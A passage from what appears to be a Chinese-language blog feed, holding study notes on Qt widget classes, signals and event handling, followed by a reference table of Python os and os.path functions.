buttonPressed(QAbstractButton *button)`||</span><br><span class="line">|`void buttonPressed(int id)`||</span><br><span class="line">|`void buttonReleased(QAbstractButton *button)`||</span><br><span class="line">|`void buttonReleased(int id)`||</span><br><span class="line">|`void buttonToggled(QAbstractButton *button, bool checked)`||</span><br><span class="line">|`void buttonToggled(int id,bool checked)`||</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">QButtonGroup *group = <span class="keyword">new</span> QButtonGroup(<span class="keyword">this</span>);</span><br><span class="line">group-&gt;addButton(ui.checkBox1);</span><br><span class="line">group-&gt;addButton(ui.checkBox2);</span><br><span class="line">group-&gt;setEclusive(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//绑定手动点击事件</span></span><br><span class="line">QObject::connect(group,SIGNAL(buttonClicked(QAbstractButton*)),<span class="keyword">this</span>,SLOT(Test(QAbstractButton *)));</span><br></pre></td></tr></table></figure><h3 id="qradiobutton"><a class="markdownIt-Anchor" href="#qradiobutton"></a> QRadioButton</h3><ul><li>类似于QCheckBox，相关属性、函数基本相同</li><li>默认是单选的</li></ul><h2 id="qcombobox"><a class="markdownIt-Anchor" href="#qcombobox"></a> QComboBox</h2><ul><li>下拉列表，还可以设置选项的图标</li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>void addItem(const QString &amp;text,const QVariant &amp;userData = QVariant())</code></td><td>新增数据，默认在结尾插入</td></tr><tr><td><code>void addItem(const QIcon &amp;icon,const QString &amp;text,const QVariant &amp;userData=QVariant())</code></td><td>新增数据以及图标</td></tr><tr><td><code>void addItems(const QStringList &amp;texts)</code></td><td>新增一组数据</td></tr><tr><td><code>void insertItems(int index,const QStringList &amp;list)</code></td><td>根据索引插入</td></tr><tr><td><code>void insertItem(int index,const QString &amp;text,const QVariant &amp;userData=QVariant())</code></td><td></td></tr><tr><td><code>void insertItem(int index,const QIcon &amp;icon,const QString &amp;text,const QVariant &amp;userData=QVariant())</code></td><td></td></tr><tr><td><code>void removeItem(int index)</code></td><td>删除</td></tr><tr><td><code>[slot]void QComboBox::clearEditText()</code></td><td>清空</td></tr><tr><td><code>[slot]void QComboBox::clear()</code></td><td>清空</td></tr><tr><td><code>QVariant itemText(int index)</code></td><td>获取文字</td></tr><tr><td><code>QVariant itemData(int index)</code></td><td>获取传入的userData</td></tr></tbody></table><table><thead><tr><th>事件</th><th>说明</th></tr></thead><tbody><tr><td><code>void activated(int index)(const QString &amp;text)</code></td><td>用户选中时触发，支持两种输入</td></tr><tr><td><code>void currentIndex(int index)(const QString &amp;text)</code></td><td>代码和用户选中都会触发</td></tr><tr><td><code>void currentTextChanged(const QString &amp;text)</code></td><td>文字变化触发，前提是可编辑模式</td></tr><tr><td><code>void editTextChanged(const QString &amp;text)</code></td><td>只有可编辑时编辑触发</td></tr><tr><td><code>void highlighted(int index)(const QString &amp;text)</code></td><td>未选中，鼠标移动到选项高亮时触发</td></tr></tbody></table><ul><li>QVariant用户自定义类型</li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>void setValue(const T &amp;value)</code></td><td></td></tr><tr><td><code>Q_DECLARE_METATYPE(Test)</code></td><td>注册类型</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">STU</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> a;</span><br><span class="line">  <span class="keyword">int</span> b;</span><br><span class="line">&#125;</span><br><span class="line">Q_DECLARE_METATYPE(STU);</span><br><span class="line">QVariant var:</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">STU</span> <span class="title">my</span>;</span></span><br><span class="line">var.setValue(my);</span><br><span class="line">ui.comboBox-&gt;addItem(<span class="string">&quot;Item001&quot;</span>,var);</span><br><span class="line">QVariant var2 = ui.comboBox-&gt;itemData(<span class="number">0</span>);</span><br><span class="line">a = var2.value&lt;STU&gt;().a</span><br></pre></td></tr></table></figure><h2 id="qslider"><a class="markdownIt-Anchor" href="#qslider"></a> QSlider</h2><ul><li>滑动条</li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>setRange(int min,int max)</code></td><td>设定范围，建议设置跟像素匹配</td></tr><tr><td><code>setSingleStep(键盘操作)</code></td><td>设置单步长度</td></tr><tr><td><code>setPageStep(鼠标操作)</code></td><td>设置单步长度</td></tr><tr><td><code>setOrientation Horizontal Vertical</code></td><td>设置方向</td></tr></tbody></table><table><thead><tr><th>事件</th><th>说明</th></tr></thead><tbody><tr><td><code>void setValue(int value)</code></td><td>鼠标拖动时触发</td></tr><tr><td><code>void sliderMoved(int value)</code></td><td>鼠标拖动时触发</td></tr><tr><td><code>void sliderPressed()</code></td><td>点击滑块</td></tr><tr><td><code>void sliderReleased()</code></td><td>松开滑块</td></tr><tr><td><code>void valueChanged(int value)</code></td><td>点击和设置值都会触发</td></tr></tbody></table><h3 id="qslider重载鼠标事件"><a class="markdownIt-Anchor" href="#qslider重载鼠标事件"></a> QSlider重载鼠标事件</h3><ul><li><code>void mousePressEvent(QMouseEvent e)</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QSlide&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XSlide</span>:</span><span class="keyword">public</span> QSlider&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">XSlide(QWidget *p=Null):QSlider(p)&#123;&#125;;~XSlide();</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="title">MousePressEvent</span><span class="params">(QMouse Event *e)</span></span>&#123;</span><br><span class="line">  QSlider::mousePressEvent(e);</span><br><span class="line">  <span class="keyword">double</span> p = (<span class="keyword">double</span>)e-&gt;pos().x()/(<span class="keyword">double</span>)width();</span><br><span class="line">  <span class="keyword">int</span> val = p*(maximum()-minium())+minimum();</span><br><span class="line">  setValue(val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="qlistwidget"><a class="markdownIt-Anchor" href="#qlistwidget"></a> QListWidget</h2><ul><li>列表</li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>selectionMode</code></td><td>单选多选模式</td></tr><tr><td><code>flow</code></td><td>从上到下还是从左到右</td></tr><tr><td><code>gridSize</code></td><td>每一行的宽高</td></tr><tr><td><code>iconSize</code></td><td>图标宽高</td></tr></tbody></table><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">//插入数据3种方法</span></span><br><span class="line">QListWidgetItem *item = <span class="keyword">new</span> QListWidgetItem;</span><br><span class="line">item.setText(itemText);</span><br><span class="line">listWidget-&gt;insertItem(row,newItem);</span><br><span class="line"><span class="keyword">new</span> QListWidgetItem(<span class="string">&quot;xxx&quot;</span>.<span class="string">&quot;listWidget&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addItem</span><span class="params">(<span class="keyword">const</span> QString &amp;label)</span></span></span><br><span class="line">[slot]void QListWidget::clear();</span><br></pre></td></tr></table></figure><table><thead><tr><th>事件</th><th>说明</th></tr></thead><tbody><tr><td><code>listWidget-&gt;setEditTriggers(QAbstractItemView::AllEditTriggers)</code></td><td></td></tr><tr><td><code>item-&gt;setFlags(Qt::ItemIsSelectable|Qt::ItemIsEnabled|Qt::ItemIsEditable)</code></td><td></td></tr><tr><td><code>No EditTriggers 0 No Editing possible</code></td><td></td></tr><tr><td><code>Currentchanged 1 Editing start whenever current item changes</code></td><td></td></tr><tr><td><code>for(int i=0;i&lt;ui.listWidget-&gt;count();i++)&#123;ui.listWidget-&gt;item(i)-&gt;text();&#125;</code></td><td>遍历</td></tr><tr><td><code>listWidget-&gt;sortItems(Qt::DescendingOrder|AscendingOrder)</code></td><td>排序</td></tr></tbody></table><ul><li>QListWidget还可以使用<code>setItemWidget</code>添加更多的控件。</li></ul><h2 id="qtablewidget"><a class="markdownIt-Anchor" href="#qtablewidget"></a> QTableWidget</h2><ul><li>表格控件</li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>horizontalHeader() verticalHeader</code></td><td>标题显示</td></tr><tr><td><code>setVerticalScrollBarPolicy</code></td><td>滚动条显示</td></tr><tr><td><code>selectionMode</code></td><td>选择模式</td></tr><tr><td><code>setSelectionBehavior</code></td><td>选择行、列、一项</td></tr><tr><td><code>setCornerButtonEnable</code></td><td>右上角全选按钮</td></tr><tr><td><code>setShowGrid setGridStyle</code></td><td>网格显示</td></tr><tr><td><code>setSortingEnable</code></td><td>排序按钮</td></tr><tr><td><code>setColumnCount(5);setRowCount(5);</code><br><code>setHorizontalHeaderItem(int column,QTableWidgetItem *itme);</code><br><code>setHorizontalHeaderLabels(const QStringList &amp;labels);</code><br><code>setVertivalHeaderItem(int column,QTableWidgetItem *itme);</code><br><code>setVertivalHeaderLabels(const QStringList &amp;labels);</code><br><code>QTableWidgetItem *hotzontalHeaderItem(int column) const</code></td><td>插入标题</td></tr><tr><td><code>setRowCount(5)</code><br><code>[slot]void insertColumn(int column);[slot]void insertRow(int row)</code><br><code>setCellWidget(row,column,new QLineEdit);void setItem(row,column,QTableWidgetItem *item)</code></td><td>插入数据</td></tr><tr><td><code>QList&lt;QTableWidgetItem*&gt;selectedItems()//空行无法选择</code><br><code>std::set&lt;int&gt;vecItemIndex;QItemSelectionModel *sel = TAB-&gt;selectionModel();QModelIndexLIst list = sele-&gt;selectedIndexes();</code></td><td>选择数据</td></tr><tr><td><code>setRowCount(int);[slot]void removeColumn(int column);[slot]void removeRow(int);QmodelIndex currentIndex();</code></td><td>删除数据</td></tr></tbody></table><table><thead><tr><th>事件</th><th>说明</th></tr></thead><tbody><tr><td><code>cellEntered(int,int);setMouseTracking</code></td><td>要先设置鼠标追踪，才能获取鼠标悬停事件，即使没有内容的表格也触发，空行有效</td></tr><tr><td><code>itemEntered(QTableWidgetItem *item);</code></td><td>只有有元素的表格触发，空行无效</td></tr><tr><td><code>cellChanged(int,int)</code></td><td></td></tr><tr><td><code>cellClicked(int,int)</code></td><td></td></tr><tr><td><code>cellDoubleClicked(int,int)</code></td><td></td></tr><tr><td><code>itemChanged(QTableWidgetItem*item)</code></td><td></td></tr></tbody></table><h2 id="qtreewidget"><a class="markdownIt-Anchor" href="#qtreewidget"></a> QTreeWidget</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>header()-&gt;setVisible(true)</code></td><td>是否显示标题</td></tr><tr><td><code>setSortingEnabled</code></td><td>点击标题排序</td></tr><tr><td><code>setAnimated</code></td><td>动画展开</td></tr><tr><td><code>setVerticalScrollBarPolicy setHorizontalScrollBarPolicy</code></td><td>滚动条显示</td></tr><tr><td><code>selectionMode</code></td><td>选择模式</td></tr><tr><td><code>setSelectionBehavior</code></td><td>选择行、列、项</td></tr><tr><td><code>QTreeWidgetItem *h=NULL;tree-&gt;setHeaderItem(new QTreeWidgetItem())//清理原来的标题，不清理数据；ui.treeWidget-&gt;clear();h=tree-&gt;headerItem();h-&gt;setText(0,QStringLiteral(&quot;text&quot;));</code></td><td>设置标题</td></tr><tr><td><code>inserTopLevelItem(int,QTreeWidgetItem*);</code><br><code>addTopLevelItem(QTreeWidgetItem*)</code><br><code>new QTreeWidgetItem(treeWidget)</code><br><code>int topLevelItemCount()const</code><br><code>void setItemWidget(QTreeWidgetItem *,int,QWidget*)</code><br><code>QList&lt;QTreeWidgetItem*&gt;selectedItems()const</code><br><code>void setColumnCount(int columns)</code><br><code>void addChild(QTreeWidgetItem*)</code><br><code>void addChildren(const QList&lt;QTreeWidgetItem*&gt;</code><br><code>void setText(int col,const QString &amp;text)</code><br><code>QTreeWidgetItem *parent()const</code><br><code>QTreeWidget * treeWidget()const</code></td><td>插入读取</td></tr></tbody></table><table><thead><tr><th>事件</th><th>说明</th></tr></thead><tbody><tr><td><code>void collapseItem(const QTreeWidgetItem*)</code></td><td></td></tr><tr><td><code>void expandItem(const QTreeWidgetItem*)</code></td><td></td></tr><tr><td><code>currentItemChanged</code></td><td></td></tr><tr><td><code>itemActivated</code></td><td></td></tr><tr><td><code>itemClicked</code></td><td></td></tr><tr><td><code>itemCollapsed</code></td><td></td></tr><tr><td><code>itemDoubleClicked</code></td><td></td></tr><tr><td><code>itemEntered</code></td><td></td></tr><tr><td><code>itemExpanded</code></td><td></td></tr><tr><td><code>itmePressed</code></td><td></td></tr></tbody></table><h2 id="qdialog"><a class="markdownIt-Anchor" href="#qdialog"></a> QDIalog</h2><ul><li>继承于QWidget</li><li>派生类：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">QColorDialog、QFileDialog、QFontDialog、QInputDialog、QProgressDialog</span><br><span class="line">QErrorMessage、QMessageBox</span><br></pre></td></tr></table></figure><ul><li>常用方法</li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>show</code></td><td></td></tr><tr><td><code>exec</code></td><td>阻塞有返回值 show</td></tr><tr><td><code>[slot]accept()</code></td><td>确认，返回值QDialog::Accepted</td></tr><tr><td><code>[slot]reject()</code></td><td>拒绝，返回值QDialog::Rejected</td></tr><tr><td><code>done(int);</code></td><td>更多返回值</td></tr><tr><td><code>result()</code></td><td>获取返回值</td></tr></tbody></table><h2 id="qprogressbar"><a class="markdownIt-Anchor" href="#qprogressbar"></a> QProgressbar</h2><ul><li>进度条，一般是展示进度。要新开线程进行处理，防止主窗口堵塞。</li></ul><h1 id="qmainwindow"><a class="markdownIt-Anchor" href="#qmainwindow"></a> QMainWindow</h1><h2 id="菜单"><a class="markdownIt-Anchor" href="#菜单"></a> 菜单</h2><ul><li>QMenuBar、QMenu、QAction</li></ul><h2 id="工具栏"><a class="markdownIt-Anchor" href="#工具栏"></a> 工具栏</h2><ul><li>QToolBar</li></ul><h2 id="状态栏"><a class="markdownIt-Anchor" href="#状态栏"></a> 状态栏</h2><ul><li>QStatusBar</li></ul><h1 id="qt事件"><a class="markdownIt-Anchor" href="#qt事件"></a> Qt事件</h1><h2 id="qevent事件重载"><a class="markdownIt-Anchor" href="#qevent事件重载"></a> QEvent事件重载</h2><ul><li><code>bool event(QEvent*)</code>返回true，则不继续向父级事件传递，直接结束。所有事件在这个函数中获取到。</li><li>派生类</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">QKeyEvent、QMouseEvent、QTouchEvent、QWheelEvent</span><br></pre></td></tr></table></figure><ul><li>QWidget重载事件函数，这样防止重载event事件时，发生的强转。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">keyPressEvent</span><span class="params">(QKeyEvent* e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">keyReleaseEvent</span><span class="params">(QKeyEvent* e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">leaveEvent</span><span class="params">(QEvent* e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">enterEvent</span><span class="params">(QEvent* e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">mouseDoubleEvent</span><span class="params">(QMouseEvent* e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">mouseMoveEvent</span><span class="params">(QMouseEvent* e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">mousePressEvent</span><span class="params">(QMouseEvent* e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">mouseReleaseEvent</span><span class="params">(QMouseEvent* e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">moveEvent</span><span class="params">(QMouseEvent* e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">resizeEvent</span><span class="params">(QResizeEvent* e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">showEvent</span><span class="params">(QShowEvent* e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">wheelEvent</span><span class="params">(QWheelEvent* e)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">paintEvent</span><span class="params">(QPaintEvent* e)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p>QMouseEvent坐标</p><ul><li>相对(本地)坐标：x(),y()</li><li>窗口坐标：QPoint windowPos()</li><li>屏幕坐标：screenPos()、QCursor::pos()</li><li>相对坐标转换为屏幕坐标：QWidget::mapToGlobal(ev-&gt;pos());</li></ul></li><li><p>按键状态</p><ul><li>button &amp; Qt::LeftButton|Qt::RightButton|Qt::MidButton</li></ul></li></ul><h1 id="qt图像绘制"><a class="markdownIt-Anchor" href="#qt图像绘制"></a> Qt图像绘制</h1><h2 id="qpainter"><a class="markdownIt-Anchor" href="#qpainter"></a> QPainter</h2><h2 id="qimage"><a class="markdownIt-Anchor" href="#qimage"></a> QImage</h2><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python库整理</title>
      <link href="/2020/07/15/python%E5%BA%93%E6%95%B4%E7%90%86/"/>
      <url>/2020/07/15/python%E5%BA%93%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>整理一些python遇到的库</p></blockquote><a id="more"></a><h1 id="系统库"><a class="markdownIt-Anchor" href="#系统库"></a> 系统库</h1><h2 id="os"><a class="markdownIt-Anchor" href="#os"></a> os</h2><ul><li>引入：<code>import os</code></li><li>函数</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>os.access(path, mode)</td><td>检验权限模式</td><td></td></tr><tr><td>os.chdir(path)</td><td>改变当前工作目录</td><td></td></tr><tr><td>os.chflags(path, flags)</td><td>设置路径的标记为数字标记。</td><td></td></tr><tr><td>os.chmod(path, mode)</td><td>更改权限</td><td></td></tr><tr><td>os.chown(path, uid, gid)</td><td>更改文件所有者</td><td></td></tr><tr><td>os.chroot(path)</td><td>改变当前进程的根目录</td><td></td></tr><tr><td>os.close(fd)</td><td>关闭文件描述符 fd</td><td></td></tr><tr><td>os.closerange(fd_low, fd_high)</td><td>关闭所有文件描述符，从 fd_low (包含) 到 fd_high (不包含), 错误会忽略</td><td></td></tr><tr><td>os.dup(fd)</td><td>复制文件描述符 fd</td><td></td></tr><tr><td>os.dup2(fd, fd2)</td><td>将一个文件描述符 fd 复制到另一个 fd2</td><td></td></tr><tr><td>os.fchdir(fd)</td><td>通过文件描述符改变当前工作目录</td><td></td></tr><tr><td>os.fchmod(fd, mode)</td><td>改变一个文件的访问权限，该文件由参数fd指定，参数mode是Unix下的文件访问权限。</td><td></td></tr><tr><td>os.fchown(fd, uid, gid)</td><td>修改一个文件的所有权，这个函数修改一个文件的用户ID和用户组ID，该文件由文件描述符fd指定。</td><td></td></tr><tr><td>os.fdatasync(fd)</td><td>强制将文件写入磁盘，该文件由文件描述符fd指定，但是不强制更新文件的状态信息。</td><td></td></tr><tr><td>os.fdopen(fd[, mode[, bufsize]])</td><td>通过文件描述符 fd 创建一个文件对象，并返回这个文件对象</td><td></td></tr><tr><td>os.fpathconf(fd, name)</td><td>返回一个打开的文件的系统配置信息。name为检索的系统配置的值，它也许是一个定义系统值的字符串，这些名字在很多标准中指定（POSIX.1, Unix 95, Unix 98, 和其它）。</td><td></td></tr><tr><td>os.fstat(fd)</td><td>返回文件描述符fd的状态，像stat()。</td><td></td></tr><tr><td>os.fstatvfs(fd)</td><td>返回包含文件描述符fd的文件的文件系统的信息，Python 3.3 相等于 statvfs()。</td><td></td></tr><tr><td>os.fsync(fd)</td><td>强制将文件描述符为fd的文件写入硬盘。</td><td></td></tr><tr><td>os.ftruncate(fd, length)</td><td>裁剪文件描述符fd对应的文件, 所以它最大不能超过文件大小。</td><td></td></tr><tr><td>os.getcwd()</td><td>返回当前工作目录</td><td></td></tr><tr><td>os.getcwdu()</td><td>返回一个当前工作目录的Unicode对象</td><td></td></tr><tr><td>os.isatty(fd)</td><td>如果文件描述符fd是打开的，同时与tty(-like)设备相连，则返回true, 否则False。</td><td></td></tr><tr><td>os.lchflags(path, flags)</td><td>设置路径的标记为数字标记，类似 chflags()，但是没有软链接</td><td></td></tr><tr><td>os.lchmod(path, mode)</td><td>修改连接文件权限</td><td></td></tr><tr><td>os.lchown(path, uid, gid)</td><td>更改文件所有者，类似 chown，但是不追踪链接。</td><td></td></tr><tr><td>os.link(src, dst)</td><td>创建硬链接，名为参数 dst，指向参数 src</td><td></td></tr><tr><td>os.listdir(path)</td><td>返回path指定的文件夹包含的文件或文件夹的名字的列表。</td><td></td></tr><tr><td>os.lseek(fd, pos, how)</td><td>设置文件描述符 fd当前位置为pos, how方式修改: SEEK_SET 或者 0 设置从文件开始的计算的pos; SEEK_CUR或者 1 则从当前位置计算; os.SEEK_END或者2则从文件尾部开始. 在unix，Windows中有效</td><td></td></tr><tr><td>os.lstat(path)</td><td>像stat(),但是没有软链接</td><td></td></tr><tr><td>os.major(device)</td><td>从原始的设备号中提取设备major号码 (使用stat中的st_dev或者st_rdev field)。</td><td></td></tr><tr><td>os.makedev(major, minor)</td><td>以major和minor设备号组成一个原始设备号</td><td></td></tr><tr><td>os.makedirs(path[, mode])</td><td>递归文件夹创建函数。像mkdir(), 但创建的所有intermediate-level文件夹需要包含子文件夹。</td><td></td></tr><tr><td>os.minor(device)</td><td>从原始的设备号中提取设备minor号码 (使用stat中的st_dev或者st_rdev field )。</td><td></td></tr><tr><td>os.mkdir(path[, mode])</td><td>以数字mode的mode创建一个名为path的文件夹.默认的 mode 是 0777 (八进制)。</td><td></td></tr><tr><td>os.mkfifo(path[, mode])</td><td>创建命名管道，mode 为数字，默认为 0666 (八进制)</td><td></td></tr><tr><td>os.mknod(filename[, mode=0600, device])</td><td>创建一个名为filename文件系统节点（文件，设备特别文件或者命名pipe）。</td><td></td></tr><tr><td><a href="http://os.name">os.name</a></td><td>判断现在正在实用的平台，Windows 返回 ‘nt‘; Linux 返回posix</td><td></td></tr><tr><td>os.open(file, flags[, mode])</td><td>打开一个文件，并且设置需要的打开选项，mode参数是可选的</td><td></td></tr><tr><td>os.openpty()</td><td>打开一个新的伪终端对。返回 pty 和 tty的文件描述符。</td><td></td></tr><tr><td>os.pathconf(path, name)</td><td>返回相关文件的系统配置信息。</td><td></td></tr><tr><td>os.pipe()</td><td>创建一个管道. 返回一对文件描述符(r, w) 分别为读和写</td><td></td></tr><tr><td>os.popen(command[, mode[, bufsize]])</td><td>从一个 command 打开一个管道，从 version 2.6起: 所有的popen*()函数已抛弃. 使用subprocess模块</td><td></td></tr><tr><td>os.read(fd, n)</td><td>从文件描述符 fd 中读取最多 n 个字节，返回包含读取字节的字符串，文件描述符 fd对应文件已达到结尾, 返回一个空字符串。</td><td></td></tr><tr><td>os.readlink(path)</td><td>返回软链接所指向的文件</td><td></td></tr><tr><td>os.remove(path)</td><td>删除路径为path的文件。如果path 是一个文件夹，将抛出OSError; 查看下面的rmdir()删除一个 directory。</td><td></td></tr><tr><td>os.removedirs(path)</td><td>递归删除目录。</td><td></td></tr><tr><td>os.rename(src, dst)</td><td>重命名文件或目录，从 src 到 dst</td><td></td></tr><tr><td>os.renames(old, new)</td><td>递归地对目录进行更名，也可以对文件进行更名。</td><td></td></tr><tr><td>os.rmdir(path)</td><td>删除path指定的空目录，如果目录非空，则抛出一个OSError异常。</td><td></td></tr><tr><td>os.stat(path)</td><td>获取path指定的路径的信息，功能等同于C API中的stat()系统调用。</td><td></td></tr><tr><td>os.stat_float_times([newvalue])</td><td>决定stat_result是否以float对象显示时间戳</td><td></td></tr><tr><td>os.statvfs(path)</td><td>获取指定路径的文件系统统计信息</td><td></td></tr><tr><td>os.symlink(src, dst)</td><td>创建一个软链接</td><td></td></tr><tr><td>os.system()</td><td>执行shell命令</td><td><code>var=123;os.environ[‘var‘]=str(var) //注意此处[]内得是 “字符串”;</code><br><code>os.system('echo $var')</code></td></tr><tr><td>os.tcgetpgrp(fd)</td><td>返回与终端fd（一个由os.open()返回的打开的文件描述符）关联的进程组</td><td></td></tr><tr><td>os.tcsetpgrp(fd, pg)</td><td>设置与终端fd（一个由os.open()返回的打开的文件描述符）关联的进程组为pg。</td><td></td></tr><tr><td>os.tempnam([dir[, prefix]])</td><td>Python3 中已删除。返回唯一的路径名用于创建临时文件。</td><td></td></tr><tr><td>os.tmpfile()</td><td>Python3 中已删除。返回一个打开的模式为(w+b)的文件对象 .这文件对象没有文件夹入口，没有文件描述符，将会自动删除。</td><td></td></tr><tr><td>os.tmpnam()</td><td>Python3 中已删除。为创建一个临时文件返回一个唯一的路径</td><td></td></tr><tr><td>os.ttyname(fd)</td><td>返回一个字符串，它表示与文件描述符fd 关联的终端设备。如果fd 没有与终端设备关联，则引发一个异常。</td><td></td></tr><tr><td>os.unlink(path)</td><td>删除文件路径</td><td></td></tr><tr><td>os.utime(path, times)</td><td>返回指定的path文件的访问和修改的时间。</td><td></td></tr><tr><td>os.walk(top[, topdown=True[, onerror=None[, followlinks=False]]])</td><td>输出在文件夹中的文件名通过在树中游走，向上或者向下。</td><td></td></tr><tr><td>os.write(fd, str)</td><td>写入字符串到文件描述符 fd中. 返回实际写入的字符串长度</td><td></td></tr><tr><td>os.path 模块</td><td>获取文件的属性信息。</td><td></td></tr><tr><td>os.pardir()</td><td>获取当前目录的父目录，以字符串形式显示目录名。</td><td></td></tr></tbody></table><table><thead><tr><th>os.path 模块</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>os.path.abspath(path)</td><td>返回绝对路径</td><td></td></tr><tr><td>os.path.basename(path)</td><td>返回文件名</td><td></td></tr><tr><td>os.path.commonprefix(list)</td><td>返回list(多个路径)中，所有path共有的最长的路径</td><td></td></tr><tr><td>os.path.dirname(path)</td><td>返回文件路径</td><td></td></tr><tr><td>os.path.exists(path)</td><td>路径存在则返回True,路径损坏返回False</td><td></td></tr><tr><td>os.path.lexists路径存在则返回True,路径损坏也返回True</td><td></td><td></td></tr><tr><td>os.path.expanduser(path)</td><td>把path中包含的&quot;<sub>&quot;和&quot;</sub>user&quot;转换成用户目录</td><td></td></tr><tr><td>os.path.expandvars(path)</td><td>根据环境变量的值替换path中包含的<code>$name</code>和<code>$&#123;name&#125;</code></td><td></td></tr><tr><td>os.path.getatime(path)</td><td>返回最近访问时间（浮点型秒数）</td><td></td></tr><tr><td>os.path.getmtime(path)</td><td>返回最近文件修改时间</td><td></td></tr><tr><td>os.path.getctime(path)</td><td>返回文件 path 创建时间</td><td></td></tr><tr><td>os.path.getsize(path)</td><td>返回文件大小，如果文件不存在就返回错误</td><td></td></tr><tr><td>os.path.isabs(path)</td><td>判断是否为绝对路径</td><td></td></tr><tr><td>os.path.isfile(path)</td><td>判断路径是否为文件</td><td></td></tr><tr><td>os.path.isdir(path)</td><td>判断路径是否为目录</td><td></td></tr><tr><td>os.path.islink(path)</td><td>判断路径是否为链接</td><td></td></tr><tr><td>os.path.ismount(path)</td><td>判断路径是否为挂载点</td><td></td></tr><tr><td>os.path.join(path1[, path2[, …]])</td><td>把目录和文件名合成一个路径</td><td></td></tr><tr><td>os.path.normcase(path)</td><td>转换path的大小写和斜杠</td><td></td></tr><tr><td>os.path.normpath(path)</td><td>规范path字符串形式</td><td></td></tr><tr><td>os.path.realpath(path)</td><td>返回path的真实路径</td><td></td></tr><tr><td>os.path.relpath(path[, start])</td><td>从start开始计算相对路径</td><td></td></tr><tr><td>os.path.samefile(path1, path2)</td><td>判断目录或文件是否相同</td><td></td></tr><tr><td>os.path.sameopenfile(fp1, fp2)</td><td>判断fp1和fp2是否指向同一文件</td><td></td></tr><tr><td>os.path.samestat(stat1, stat2)</td><td>判断stat tuple stat1和stat2是否指向同一个文件</td><td></td></tr><tr><td>os.path.split(path)</td><td>把路径分割成 dirname 和 basename，返回一个元组</td><td></td></tr><tr><td>os.path.splitdrive(path)</td><td>一般用在 windows 下，返回驱动器名和路径组成的元组</td><td></td></tr><tr><td>os.path.splitext(path)</td><td>分割路径中的文件名与拓展名</td><td></td></tr><tr><td>os.path.splitunc(path)</td><td>把路径分割为加载点与文件</td><td></td></tr><tr><td>os.path.walk(path, visit, arg)</td><td>遍历path，进入每个目录都调用visit函数，visit函数必须有3个参数(arg, dirname, names)，dirname表示当前目录的目录名，names代表当前目录下的所有文件名，args则为walk的第三个参数</td><td></td></tr><tr><td>os.path.supports_unicode_filenames</td><td>设置是否支持unicode路径名</td><td></td></tr></tbody></table><h2 